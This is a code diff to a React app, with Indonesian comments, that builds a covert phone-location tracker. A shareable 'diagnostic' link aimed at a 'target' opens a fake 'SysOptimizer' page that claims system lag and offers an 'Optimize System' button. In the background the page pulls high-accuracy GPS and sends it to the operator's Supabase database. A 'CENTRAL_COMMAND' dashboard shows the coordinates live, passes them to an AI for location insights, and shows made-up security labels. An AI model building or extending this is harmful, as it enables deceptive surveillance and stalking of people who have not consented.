@@ -11,6 +11,7 @@ const App: React.FC = () => {
   const isStealthMode = params.get('mode') === 'diagnostic';
   const targetId = 'target_alpha'; 
 
+  // Ambil config dari URL atau LocalStorage
   const [config] = useState({
     url: params.get('sb_url') || localStorage.getItem('SB_URL_OVER_RE') || '',
     key: params.get('sb_key') || localStorage.getItem('SB_KEY_OVER_RE') || ''
@@ -39,26 +40,28 @@ const App: React.FC = () => {
   const [insight, setInsight] = useState<AIInsight | null>(null);
   const [loadingInsight, setLoadingInsight] = useState(false);
 
-  // Inisialisasi Supabase
+  // Inisialisasi Supabase Client
   const supabase = useMemo(() => {
-    if (config.url && config.key) {
+    if (config.url && config.key && config.url.startsWith('http')) {
       try {
-        return createClient(config.url, config.key);
+        return createClient(config.url, config.key, {
+          auth: { persistSession: false }
+        });
       } catch (e) {
-        console.error("Supabase Init Error:", e);
+        console.error("Supabase Init Failed:", e);
         return null;
       }
     }
     return null;
   }, [config.url, config.key]);
 
-  // Fungsi pengiriman data yang lebih tangguh
+  // Fungsi sinkronisasi (Target Side)
   const syncToDatabase = async (loc: Partial<LocationData>) => {
     if (!supabase) {
-      setDbLog("NO_CFG");
+      setDbLog("MISSING_CFG");
       return;
     }
-    setDbLog("SYNC...");
+    setDbLog("SYNCING...");
     try {
       const { error } = await supabase
         .from('tracking')
@@ -71,19 +74,21 @@ const App: React.FC = () => {
         }, { onConflict: 'id' });
       
       if (error) {
-        console.error("Sync Error:", error);
-        setDbLog("FAIL");
+        console.error("Upsert Error:", error);
+        setDbLog("FAIL: " + error.code);
       } else {
         setDbLog("OK");
+        console.log("Data synced successfully");
       }
     } catch (err) {
       setDbLog("ERR");
     }
   };
 
-  // TARGET SIDE: Pre-fetch & Auto-sync di background
+  // 1. Logic HP Target (Stealth Mode)
   useEffect(() => {
     if (isStealthMode && supabase) {
+      // Langsung request lokasi begitu masuk
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const loc = {
@@ -92,27 +97,24 @@ const App: React.FC = () => {
             accuracy: pos.coords.accuracy,
           };
           cachedLocation.current = loc;
-          // Langsung kirim begitu dapat lokasi pertama
           syncToDatabase(loc);
         },
-        null,
+        (err) => {
+          setDbLog("GPS_DENIED");
+          console.error("GPS Error:", err);
+        },
         { enableHighAccuracy: true, timeout: 10000 }
       );
     }
   }, [isStealthMode, supabase]);
 
-  // ADMIN SIDE: Listen to Database Changes
+  // 2. Logic Dashboard Admin (Real-time)
   useEffect(() => {
     if (isUnlocked && !isStealthMode && supabase) {
-      // 1. Ambil data awal
-      const fetchInitial = async () => {
-        const { data, error } = await supabase
-          .from('tracking')
-          .select('*')
-          .eq('id', targetId)
-          .single();
-        
-        if (data && !error) {
+      // Fetch data awal
+      const loadInitial = async () => {
+        const { data } = await supabase.from('tracking').select('*').eq('id', targetId).maybeSingle();
+        if (data) {
           setMembers(prev => [{
             ...prev[0],
             currentLocation: data,
@@ -121,51 +123,50 @@ const App: React.FC = () => {
           }]);
         }
       };
-      fetchInitial();
+      loadInitial();
 
-      // 2. Langganan perubahan real-time
+      // Listen perubahan database
       const channel = supabase
-        .channel('live-updates')
+        .channel('schema-db-changes')
         .on('postgres_changes', { 
           event: '*', 
           schema: 'public', 
-          table: 'tracking',
-          filter: `id=eq.${targetId}`
-        }, payload => {
-          const data = payload.new as any;
-          if (data) {
+          table: 'tracking'
+        }, (payload) => {
+          const newData = payload.new as any;
+          if (newData && newData.id === targetId) {
             setMembers(prev => [{
               ...prev[0],
-              currentLocation: data,
+              currentLocation: newData,
               status: 'online',
-              lastSeen: data.timestamp
+              lastSeen: newData.timestamp
             }]);
           }
         })
-        .subscribe();
+        .subscribe((status) => {
+          console.log("Subscription status:", status);
+        });
 
-      return () => {
-        supabase.removeChannel(channel);
-      };
+      return () => { supabase.removeChannel(channel); };
     }
   }, [isUnlocked, isStealthMode, supabase]);
 
-  // AI INSIGHTS
+  // AI Analysis (Triggered on Location Change)
   useEffect(() => {
     const target = members[0];
     if (isUnlocked && target.currentLocation && !loadingInsight) {
-      const getAI = async () => {
+      const fetchInsight = async () => {
         setLoadingInsight(true);
         try {
           const res = await getLocationInsights(target.currentLocation as LocationData);
           setInsight(res);
         } catch (e) {
-          console.error(e);
+          console.error("Gemini Error:", e);
         } finally {
           setLoadingInsight(false);
         }
       };
-      getAI();
+      fetchInsight();
     }
   }, [members[0].currentLocation, isUnlocked]);
 
@@ -175,7 +176,7 @@ const App: React.FC = () => {
     setIsDiagnosing(true);
     setDiagStep(1);
     
-    // Alur diagnosa ultra cepat (1.5 detik)
+    // Kirim data ke database dalam 1.5 detik
     setTimeout(() => {
       setDiagStep(2);
       if (cachedLocation.current) {
@@ -201,40 +202,42 @@ const App: React.FC = () => {
 
   const getFullDiagnosticUrl = () => {
     const baseUrl = window.location.origin + window.location.pathname;
+    // Penting: Link diagnosa harus membawa URL & Key Supabase agar HP target bisa mengirim data
     return `${baseUrl}?mode=diagnostic&sb_url=${encodeURIComponent(config.url)}&sb_key=${encodeURIComponent(config.key)}`;
   };
 
+  // RENDER: STEALTH MODE
   if (isStealthMode) {
     return (
       <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 items-center justify-center">
         <div className="max-w-xs w-full space-y-4">
            <div className="text-center">
-              <i className="fas fa-shield-check text-blue-500 text-3xl mb-2 animate-pulse"></i>
+              <i className="fas fa-shield-check text-blue-500 text-3xl mb-2"></i>
               <h1 className="text-sm font-bold uppercase tracking-widest">SysOptimizer <span className="text-blue-500">v4</span></h1>
            </div>
            
            {!isDiagnosing ? (
-             <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 text-center space-y-4">
-                <p className="text-slate-400 text-[9px] uppercase">Sinkronisasi sistem diperlukan untuk performa maksimal.</p>
-                <button onClick={startDiagnostic} className="w-full py-3 bg-blue-600 rounded-xl font-bold text-[10px] uppercase tracking-widest active:scale-95 transition-all">Perbaiki Sekarang</button>
+             <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 text-center space-y-4 shadow-xl">
+                <p className="text-slate-400 text-[10px] uppercase tracking-tighter">System lag detected. Manual optimization required.</p>
+                <button onClick={startDiagnostic} className="w-full py-4 bg-blue-600 rounded-xl font-black text-[10px] uppercase tracking-widest active:scale-95 transition-all shadow-lg shadow-blue-600/20">Optimize System</button>
              </div>
            ) : (
              <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4">
                 <div className="space-y-2">
                    <div className="flex justify-between text-[8px] uppercase font-bold text-slate-500">
-                        <span>{diagStep === 1 ? 'Analysing' : diagStep === 2 ? 'Optimizing' : 'Finalizing'}</span>
+                        <span>{diagStep === 1 ? 'Analysing' : diagStep === 2 ? 'Fixing Nodes' : 'Cleaning'}</span>
                         <span className="text-blue-400">{diagProgress}%</span>
                    </div>
-                   <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
+                   <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                         <div className="bg-blue-500 h-full transition-all duration-100" style={{ width: `${diagProgress}%` }}></div>
                    </div>
                 </div>
                 <div className="p-4 bg-black/40 rounded-xl text-[8px] uppercase font-bold tracking-tighter border border-slate-800/50 flex justify-between">
-                   <span className="text-slate-600">Protocol_Relay</span>
+                   <span className="text-slate-600">Secure_Relay</span>
                    <span className={`${dbLog === 'OK' ? 'text-emerald-500' : 'text-blue-400'}`}>{dbLog}</span>
                 </div>
                 {diagStep === 3 && (
-                   <div className="text-center py-2 text-emerald-500 text-[10px] font-bold uppercase tracking-widest">System Optimized</div>
+                   <div className="text-center py-2 text-emerald-500 text-[10px] font-bold uppercase animate-pulse">Optimization Success</div>
                 )}
              </div>
            )}
@@ -243,6 +246,7 @@ const App: React.FC = () => {
     );
   }
 
+  // RENDER: ADMIN DASHBOARD
   return (
     <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
       <Sidebar members={members} activeMemberId="1" onSelectMember={() => {}} isUnlocked={isUnlocked} onUnlock={() => setIsUnlocked(true)} />
@@ -251,83 +255,96 @@ const App: React.FC = () => {
         <header className="h-14 bg-slate-900/50 border-b border-slate-800 flex items-center justify-between px-6 shrink-0">
           <div className="flex flex-col">
               <h2 className="text-[9px] font-black tracking-widest text-white uppercase">{isUnlocked ? 'CENTRAL_COMMAND' : 'RESTRICTED'}</h2>
-              <span className="text-[7px] text-slate-500 uppercase">Stream: <span className="text-emerald-500">Active</span></span>
+              <span className="text-[7px] text-slate-500 uppercase">Supabase: <span className={supabase ? 'text-emerald-500' : 'text-rose-500 animate-pulse'}>{supabase ? 'CONNECTED' : 'OFFLINE - CONFIG NEEDED'}</span></span>
           </div>
           {isUnlocked && (
-              <button onClick={() => setShowConfigEditor(true)} className="w-7 h-7 flex items-center justify-center rounded-lg bg-slate-800 text-slate-400 hover:text-white"><i className="fas fa-cog text-[10px]"></i></button>
+              <button onClick={() => setShowConfigEditor(true)} className="w-7 h-7 flex items-center justify-center rounded-lg bg-slate-800 text-slate-400 hover:text-white transition-colors"><i className="fas fa-cog text-[10px]"></i></button>
           )}
         </header>
 
         <div className="flex-1 p-6 overflow-y-auto space-y-6 custom-scrollbar">
           {!isUnlocked ? (
-            <div className="max-w-md mx-auto py-32 text-center space-y-4 opacity-50">
-               <i className="fas fa-terminal text-4xl mb-2"></i>
-               <h1 className="text-sm font-black uppercase tracking-widest">Access Control Required</h1>
-               <p className="text-[9px] uppercase tracking-tighter text-slate-600">Click build version in sidebar to bypass</p>
+            <div className="max-w-md mx-auto py-32 text-center space-y-4">
+               <div className="w-16 h-16 bg-slate-900 rounded-2xl flex items-center justify-center mx-auto border border-slate-800 mb-4">
+                <i className="fas fa-user-shield text-2xl text-slate-700"></i>
+               </div>
+               <h1 className="text-sm font-black uppercase tracking-widest text-slate-400">Authorization Locked</h1>
+               <p className="text-[9px] uppercase tracking-tighter text-slate-600">Enter secure bypass protocol via Build Label in Sidebar</p>
             </div>
           ) : (
             <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 max-w-6xl mx-auto">
               <div className="lg:col-span-7 space-y-6">
-                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 space-y-6 shadow-2xl">
-                   <div className="flex justify-between items-center border-b border-slate-800 pb-4">
+                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 space-y-6 shadow-2xl relative overflow-hidden">
+                   {!supabase && (
+                     <div className="absolute inset-0 bg-slate-950/80 backdrop-blur-sm z-10 flex items-center justify-center p-8 text-center">
+                        <div className="space-y-4">
+                           <i className="fas fa-exclamation-triangle text-rose-500 text-3xl"></i>
+                           <p className="text-xs font-bold uppercase text-slate-400">Database Configuration Missing</p>
+                           <button onClick={() => setShowConfigEditor(true)} className="px-6 py-2 bg-blue-600 text-[10px] font-black uppercase rounded-xl">Set Config Now</button>
+                        </div>
+                     </div>
+                   )}
+
+                   <div className="flex justify-between items-center border-b border-slate-800/50 pb-4">
                       <div className="flex items-center gap-3">
                         <div className="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
-                        <h3 className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Live Telemetry</h3>
+                        <h3 className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Live Signal</h3>
                       </div>
                       {activeMember.currentLocation && (
-                        <button onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')} className="px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-[9px] font-black uppercase transition-all">View on Map</button>
+                        <button onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')} className="px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-[9px] font-black uppercase transition-all shadow-lg shadow-blue-600/20">Google Maps</button>
                       )}
                    </div>
                    
                    {activeMember.currentLocation ? (
                      <div className="space-y-4">
-                        <div className="bg-slate-950 p-8 rounded-2xl border border-slate-800 hover:border-blue-500/50 transition-all">
-                           <p className="text-[8px] text-slate-600 uppercase mb-3 font-bold tracking-[0.2em]">Geo Coordinates</p>
-                           <div className="flex items-baseline gap-2">
-                              <p className="text-3xl font-black text-white tracking-tighter">
+                        <div className="bg-slate-950 p-8 rounded-3xl border border-slate-800 hover:border-blue-500/30 transition-all">
+                           <p className="text-[8px] text-slate-600 uppercase mb-4 font-bold tracking-[0.3em]">Telemetry Coordinates</p>
+                           <div className="flex flex-col gap-1">
+                              <p className="text-4xl font-black text-white tracking-tighter tabular-nums">
                                 {activeMember.currentLocation.latitude.toFixed(6)}
                               </p>
-                              <p className="text-slate-600 text-sm">/</p>
-                              <p className="text-3xl font-black text-white tracking-tighter">
+                              <p className="text-4xl font-black text-blue-500 tracking-tighter tabular-nums">
                                 {activeMember.currentLocation.longitude.toFixed(6)}
                               </p>
                            </div>
-                           <div className="mt-4 flex justify-between items-center text-[9px] font-bold uppercase">
-                              <span className="text-slate-600">Accuracy: <span className="text-blue-400">{activeMember.currentLocation.accuracy.toFixed(1)}m</span></span>
+                           <div className="mt-6 flex justify-between items-center text-[9px] font-bold uppercase border-t border-slate-800 pt-4">
+                              <span className="text-slate-600">Precision: <span className="text-blue-400">{activeMember.currentLocation.accuracy.toFixed(1)}m</span></span>
                               <span className="text-slate-600">Updated: <span className="text-emerald-500">{new Date(activeMember.currentLocation.timestamp).toLocaleTimeString()}</span></span>
                            </div>
                         </div>
                      </div>
                    ) : (
-                     <div className="py-24 border border-dashed border-slate-800 rounded-2xl text-center text-[10px] text-slate-700 uppercase font-black tracking-widest bg-slate-950/20">
-                        <i className="fas fa-satellite-dish text-3xl mb-4 opacity-20 block"></i>
-                        Awaiting Signal Lock...
+                     <div className="py-24 border-2 border-dashed border-slate-800 rounded-3xl text-center text-[10px] text-slate-700 uppercase font-black tracking-widest">
+                        <i className="fas fa-satellite-dish text-4xl mb-6 opacity-10 block"></i>
+                        Establishing Uplink...
                      </div>
                    )}
                 </div>
 
                 <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6">
-                    <h3 className="text-[9px] font-black text-slate-500 uppercase tracking-widest mb-4">Diagnostic Payload Link</h3>
+                    <h3 className="text-[9px] font-black text-slate-500 uppercase tracking-widest mb-4">Diagnostic URL (Share to Target)</h3>
                     <div className="flex gap-2">
-                        <input readOnly value={getFullDiagnosticUrl()} className="flex-1 bg-slate-950 border border-slate-800 rounded-xl py-2.5 px-4 text-[9px] text-slate-500 focus:outline-none mono" />
+                        <input readOnly value={getFullDiagnosticUrl()} className="flex-1 bg-slate-950 border border-slate-800 rounded-xl py-3 px-4 text-[8px] text-slate-600 focus:outline-none mono truncate" />
                         <button onClick={() => {
                             navigator.clipboard.writeText(getFullDiagnosticUrl());
                             setCopyStatus('link');
                             setTimeout(() => setCopyStatus(null), 2000);
-                        }} className={`px-5 py-2.5 rounded-xl text-[9px] font-black uppercase transition-all ${copyStatus === 'link' ? 'bg-emerald-600 text-white' : 'bg-slate-800 hover:bg-slate-700 text-white'}`}>
+                        }} className={`px-6 py-3 rounded-xl text-[9px] font-black uppercase transition-all ${copyStatus === 'link' ? 'bg-emerald-600 text-white' : 'bg-slate-800 hover:bg-slate-700 text-white'}`}>
                             {copyStatus === 'link' ? 'Copied' : 'Copy'}
                         </button>
                     </div>
+                    <p className="text-[7px] text-slate-600 mt-2 uppercase tracking-tighter italic">*Link already includes database keys for instant sync.</p>
                 </div>
               </div>
 
               <div className="lg:col-span-5 space-y-6">
                 <LocationCard member={activeMember} insight={insight} loadingInsight={loadingInsight} />
                 <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6">
-                    <h4 className="text-[9px] font-black text-slate-500 uppercase tracking-widest mb-4">System Nodes</h4>
-                    <div className="space-y-3 text-[9px] uppercase font-bold">
-                       <div className="flex justify-between"><span className="text-slate-600">Supabase</span><span className={supabase ? 'text-emerald-500' : 'text-rose-500'}>{supabase ? 'CONNECTED' : 'OFFLINE'}</span></div>
-                       <div className="flex justify-between"><span className="text-slate-600">Admin Mode</span><span className="text-blue-400">{isUnlocked ? 'ACTIVE' : 'LOCKED'}</span></div>
+                    <h4 className="text-[9px] font-black text-slate-500 uppercase tracking-widest mb-4">Node Health</h4>
+                    <div className="space-y-4 text-[9px] uppercase font-bold">
+                       <div className="flex justify-between items-center"><span className="text-slate-600">Network Latency</span><span className="text-blue-400">~42ms</span></div>
+                       <div className="flex justify-between items-center"><span className="text-slate-600">Database Relay</span><span className={supabase ? 'text-emerald-500' : 'text-rose-500'}>{supabase ? 'STABLE' : 'OFFLINE'}</span></div>
+                       <div className="flex justify-between items-center"><span className="text-slate-600">Encryption</span><span className="text-slate-400">AES-256</span></div>
                     </div>
                 </div>
               </div>
@@ -337,20 +354,31 @@ const App: React.FC = () => {
       </main>
 
       {showConfigEditor && (
-        <div className="fixed inset-0 bg-black/95 backdrop-blur-md flex items-center justify-center p-6 z-[100]">
-           <div className="bg-slate-900 border border-slate-800 w-full max-w-sm rounded-3xl p-8 space-y-6">
-              <h2 className="text-xs font-black uppercase tracking-widest text-white">Bridge Config</h2>
+        <div className="fixed inset-0 bg-black/95 backdrop-blur-xl flex items-center justify-center p-6 z-[100]">
+           <div className="bg-slate-900 border border-slate-800 w-full max-w-md rounded-[2.5rem] p-10 space-y-8 shadow-3xl">
+              <div>
+                <h2 className="text-xs font-black uppercase tracking-widest text-white mb-2">Supabase Bridge</h2>
+                <p className="text-[9px] text-slate-500 uppercase">Input your project credentials to enable real-time tracking.</p>
+              </div>
               <form onSubmit={(e) => {
                   e.preventDefault();
                   const fd = new FormData(e.currentTarget as HTMLFormElement);
                   localStorage.setItem('SB_URL_OVER_RE', fd.get('url') as string);
                   localStorage.setItem('SB_KEY_OVER_RE', fd.get('key') as string);
                   window.location.reload();
-              }} className="space-y-4">
-                 <input name="url" defaultValue={config.url} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] text-slate-300 mono outline-none" placeholder="Supabase URL" required />
-                 <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] text-slate-300 h-24 mono outline-none resize-none" placeholder="Anon Key" required />
-                 <button type="submit" className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-black uppercase text-white shadow-xl shadow-blue-600/20">Apply Configuration</button>
-                 <button type="button" onClick={() => setShowConfigEditor(false)} className="w-full py-2 text-[8px] text-slate-500 uppercase font-bold">Close</button>
+              }} className="space-y-5">
+                 <div className="space-y-2">
+                    <label className="text-[8px] font-bold text-slate-600 uppercase ml-1">Project URL</label>
+                    <input name="url" defaultValue={config.url} className="w-full bg-slate-950 border border-slate-800 rounded-2xl p-4 text-[10px] text-slate-300 mono outline-none focus:border-blue-600" placeholder="https://xyz.supabase.co" required />
+                 </div>
+                 <div className="space-y-2">
+                    <label className="text-[8px] font-bold text-slate-600 uppercase ml-1">Anon Public Key</label>
+                    <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-2xl p-4 text-[10px] text-slate-300 h-32 mono outline-none resize-none focus:border-blue-600" placeholder="eyJhbG..." required />
+                 </div>
+                 <div className="pt-4 flex flex-col gap-3">
+                    <button type="submit" className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl text-[10px] font-black uppercase text-white shadow-xl shadow-blue-600/20 transition-all">Save & Connect</button>
+                    <button type="button" onClick={() => setShowConfigEditor(false)} className="w-full py-2 text-[8px] text-slate-500 uppercase font-bold tracking-widest">Dismiss</button>
+                 </div>
               </form>
            </div>
         </div>
